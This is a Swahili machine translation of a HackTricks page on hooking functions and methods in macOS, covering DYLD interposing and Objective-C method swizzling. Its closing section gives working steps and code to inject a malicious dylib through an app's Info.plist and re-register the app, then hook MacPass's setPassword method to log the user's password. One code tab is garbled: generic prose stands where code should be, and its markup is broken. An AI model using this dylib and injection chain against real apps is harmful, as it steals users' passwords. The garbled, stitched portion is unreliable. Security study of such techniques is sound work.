# Kufunga Kazi ya macOS

<details>

<summary><strong>Jifunze kuhusu kuvamia AWS kutoka mwanzo hadi kuwa shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

- Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
- Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
- Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
- **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
- **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Kuingilia Kazi

Tengeneza **dylib** na sehemu ya **`__interpose`** (au sehemu iliyofungwa na **`S_INTERPOSING`**) inayojumuisha jozi za **pointa za kazi** zinazorejelea **kazi za awali** na **zilizobadilishwa**.

Kisha, **ingiza** dylib na **`DYLD_INSERT_LIBRARIES`** (kuingilia kazi kunahitaji kutokea kabla ya programu kuu kupakia). Kwa dhahiri [**vizuizi** vilivyowekwa kwenye matumizi ya **`DYLD_INSERT_LIBRARIES`** vinatumika hapa pia](macos-library-injection/#check-restrictions).

### Kuingilia printf

{% tabs %}
{% tab title="interpose.c" %}
{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{% endcode %}
{% endtab %}

{% tab title="hello.c" %}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{% endtab %}

{% tab title="interpose2.c" %} 

### macOS Function Hooking

Kufanya hook kwa kazi za mfumo wa macOS ni mbinu inayoweza kutumika kubadilisha tabia ya programu au mfumo wa uendeshaji kwa kuingilia kati na kubadilisha wito wa kazi fulani. Hii inaweza kutumiwa kwa madhumuni ya kufanya ufuatiliaji, kurekebisha makosa au hata kufanya udukuzi.

Kwa mfano, unaweza kufanya hook kwa kazi ya `open()` ili kufuatilia ni faili zipi zinazofunguliwa na programu fulani au hata kubadilisha njia ya ufikiaji wa faili.

Kumbuka kwamba kufanya hook kwa kazi za mfumo wa macOS inahitaji ufahamu wa kina wa jinsi kazi hizo zinavyofanya kazi ili kuzuia kuharibu utendaji wa mfumo au programu. 

### Hatari za Kufanya Hook kwa Kazi za macOS

Kufanya hook kwa kazi za macOS inaweza kusababisha matatizo kama vile kuvuruga utendaji wa mfumo, kusababisha migogoro kati ya programu, au hata kusababisha mfumo kuwa usioaminika. Ni muhimu kuzingatia hatari hizi kabla ya kufanya mabadiliko yoyote kwa kazi za mfumo wa macOS. 

### Jinsi ya Kuzuia Kufanyiwa Hook kwa Kazi za macOS

Kuzuia kufanyiwa hook kwa kazi za macOS, unaweza kutumia mbinu za kuhakikisha usalama kama vile kutumia vyeti vya dijiti, kudhibiti upatikanaji wa faili, au hata kufunga programu za usalama zinazoweza kugundua mabadiliko yasiyoruhusiwa kwenye mfumo wako. 

### Hitimisho

Kufanya hook kwa kazi za mfumo wa macOS ni mbinu yenye nguvu inayoweza kutumiwa kwa madhumuni mbalimbali, lakini inahitaji ufahamu wa kina na tahadhari ili kuepuka athari mbaya kwa utendaji wa mfumo au usalama. 

{% endtab %}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{% endtab %}
{% endtabs %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
## Kufunga Mbinu

Katika ObjectiveC hivi ndivyo mbinu inavyoitwa: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Inahitajika **kitu**, **mbinu** na **vipimo**. Na wakati mbinu inaitwa **ujumbe hutumwa** kutumia kazi **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Kitu ni **`someObject`**, mbinu ni **`@selector(method1p1:p2:)`** na hoja ni **value1**, **value2**.

Kufuatia miundo ya vitu, ni rahisi kufikia **orodha ya mbinu** ambapo **majina** na **alama** kwa msimbo wa mbinu zinapatikana.

{% hint style="danger" %}
Tafadhali kumbuka kwamba kwa sababu mbinu na madarasa hupatikana kulingana na majina yao, habari hii imehifadhiwa kwenye faili ya binary, hivyo ni rahisi kuipata kwa kutumia `otool -ov </path/bin>` au [`class-dump </path/bin>`](https://github.com/nygard/class-dump)
{% endhint %}

### Kufikia mbinu za asili

Inawezekana kupata habari za mbinu kama jina, idadi ya vipimo au anwani kama ilivyo katika mfano ufuatao:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Kuchanganya Njia na method\_exchangeImplementations

Kazi ya **`method_exchangeImplementations`** inaruhusu **kubadilisha** **anwani** ya **utekelezaji** wa **kazi moja kwa nyingine**.

{% hint style="danger" %}
Hivyo wakati kazi inaitwa ni **kazi nyingine inayotekelezwa**.
{% endhint %}
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
{% hint style="warning" %}
Katika kesi hii ikiwa **mimba ya utekelezaji wa halali** inathibitisha **jina la njia** inaweza **kugundua** hii swizzling na kuzuia isitokee.

Mbinu ifuatayo haina kizuizi hiki.
{% endhint %}

### Kufunga Njia kwa kutumia method\_setImplementation

Muundo wa awali ni wa ajabu kwa sababu unabadilisha utekelezaji wa njia 2 moja kutoka kwa nyingine. Kwa kutumia kazi **`method_setImplementation`** unaweza **kubadilisha** **utekelezaji** wa **njia kwa nyingine**.

Kumbuka **kuhifadhi anwani ya utekelezaji wa ile ya awali** ikiwa utaita kutoka kwa utekelezaji mpya kabla ya kuibadilisha kwa sababu baadaye itakuwa ngumu sana kutambua anwani hiyo.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Mbinu ya Mashambulizi ya Hooking

Katika ukurasa huu njia tofauti za kufunga kazi zilijadiliwa. Hata hivyo, zilihusisha **kuendesha nambari ndani ya mchakato ili kushambulia**.

Ili kufanya hivyo, mbinu rahisi zaidi ya kutumia ni kuingiza [Dyld kupitia mazingira ya mazingira au utekaji nyara](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md). Hata hivyo, nadhani hii pia inaweza kufanywa kupitia [Uingizaji wa mchakato wa Dylib](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).

Hata hivyo, chaguo zote mbili zinakabiliwa na **kikomo** kwa **binari/mchakato usiolindwa**. Angalia kila mbinu kujifunza zaidi kuhusu vikwazo.

Hata hivyo, shambulizi la kufunga kazi ni maalum sana, muhusika atafanya hivi ili **kuiba habari nyeti kutoka ndani ya mchakato** (ikiwa sivyo ungefanya shambulizi la kuingiza mchakato). Na habari nyeti hii inaweza kuwa katika Programu zilizopakuliwa na mtumiaji kama vile MacPass.

Kwa hivyo, mwelekeo wa muhusika ungekuwa au kupata mwanya wa usalama au kuondoa saini ya programu, kuingiza **`DYLD_INSERT_LIBRARIES`** mazingira ya mazingira kupitia Info.plist ya programu kwa kuongeza kitu kama:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
na kisha **sajili tena** programu:

{% code overflow="wrap" %}
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
{% endcode %}

Ongeza katika maktaba hiyo nambari ya kufunga ili kuchukua habari: Nywila, ujumbe...

{% hint style="danger" %}
Tafadhali kumbuka kuwa katika toleo jipya la macOS ikiwa utaondoa **sahihi** ya faili ya maombi na ilikuwa imeendeshwa hapo awali, macOS **haitaendesha maombi** tena.
{% endhint %}

#### Mfano wa Maktaba
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Marejeo

* [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
